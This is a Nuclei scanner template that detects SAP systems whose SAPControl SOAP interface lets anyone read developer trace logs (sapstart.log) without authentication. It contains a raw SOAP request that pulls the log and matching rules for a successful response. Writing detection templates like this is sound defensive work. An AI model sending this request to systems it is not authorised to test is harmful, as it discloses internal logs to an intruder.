nuclei-v3/S/sap-readlogfile-disclosure.yaml

http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - ReadDeveloperTraceResponse
    - <lines>
    - <item>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=UTF-8\n\
    SOAPAction: '\"\"'\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<SOAP-ENV:Envelope\
    \ xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <SOAP-ENV:Header>\n\
    \    <sapsess:Session xmlns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\"\
    >\n      <enableSession>true</enableSession>\n    </sapsess:Session>\n  </SOAP-ENV:Header>\n\
    \  <SOAP-ENV:Body>\n    <ns1:ReadDeveloperTrace xmlns:ns1=\"urn:SAPControl\">\n\
    \      <filename>sapstart.log</filename>\n    </ns1:ReadDeveloperTrace>\n  </SOAP-ENV:Body>\n\
    </SOAP-ENV:Envelope>\n"
id: sap-readlogfile-disclosure
info:
  author: LRVT,l4rm4nd
  description: 'Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl
    SOAP interface exposes the ReadDeveloperTrace web method without authentication.

    '
  metadata:
    max-request: 1
  name: SAPControl ReadDeveloperTrace Log - Disclosure
  reference:
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/sap/sap_mgmt_con_getlogfiles.rb
  - https://itsiti.com/csmon/
  - https://sapbasisinfo.com/blog/2017/01/20/sapcontrol-command-funtions-for-sap-hana/
  - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362959700.html
  severity: medium
  tags: misconfig,sap,sapcontrol,soap,log,disclosure
